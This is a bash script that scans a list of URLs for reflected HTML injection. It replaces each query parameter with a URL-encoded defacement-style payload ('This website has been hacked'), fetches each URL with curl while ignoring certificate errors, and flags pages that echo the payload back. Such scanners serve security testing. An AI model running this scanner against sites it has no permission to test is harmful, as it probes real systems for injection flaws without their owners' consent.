#!/bin/bash

# Color codes
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
NC="\033[0m" # No Color

# Check if a file was provided
if [ -z "$1" ]; then
    echo -e "${RED}Usage: $0 <url_list_file>${NC}"
    exit 1
fi

# Payload to test HTML injection
payload='"/><h1>This website has been hacked</h1>'

# URL encode function
urlencode() {
    local string="${1}"
    local strlen=${#string}
    local encoded=""
    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) printf -v encoded '%s%%%02X' "$encoded" "'$c"
        esac
    done
    echo "$encoded"
}

# Read URLs from the file
while IFS= read -r url || [[ -n "$url" ]]; do
    echo -e "${BLUE}[*] Testing: $url${NC}"

    base_url=$(echo "$url" | cut -d'?' -f1)
    query=$(echo "$url" | cut -s -d'?' -f2)

    if [[ -z "$query" ]]; then
        echo -e "${YELLOW}[-] No query parameters found, skipping.${NC}"
        continue
    fi

    # Build injected query
    new_query=""
    IFS='&' read -ra params <<< "$query"
    for param in "${params[@]}"; do
        key=$(echo "$param" | cut -d'=' -f1)
        new_query+="${key}=$(urlencode "$payload")&"
    done

    new_query="${new_query%&}"  # Remove trailing '&'

    test_url="${base_url}?${new_query}"

    response=$(curl -sk --max-time 10 "$test_url")

    if echo "$response" | grep -q "$payload"; then
        echo -e "${GREEN}[+] Potential HTML Injection found at: $test_url${NC}"
    else
        echo -e "${RED}[-] No injection detected.${NC}"
    fi

done < "$1"
